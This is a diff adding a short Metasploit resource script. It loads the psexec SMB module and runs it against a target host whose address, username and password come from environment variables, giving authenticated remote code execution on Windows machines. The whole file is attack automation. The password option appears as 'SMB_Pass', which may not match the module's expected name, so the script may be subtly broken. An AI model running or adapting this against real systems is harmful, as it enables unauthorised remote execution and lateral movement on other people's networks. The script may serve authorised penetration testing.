@@ -1,0 +1,13 @@
+#Specifies what module to use
+use exploit/windows/smb/psexec
+<ruby>
+#Set the target host
+run_single("set RHOST #{ENV['IP_ADDR']}")
+#Sets the SMB username
+run_single("set SMBUser #{ENV['USER']}")
+#Sets the SMB user's password
+run_single("set SMB_Pass #{ENV['PASS']}")
+</ruby>
+#Run the script and quit
+run
+quit
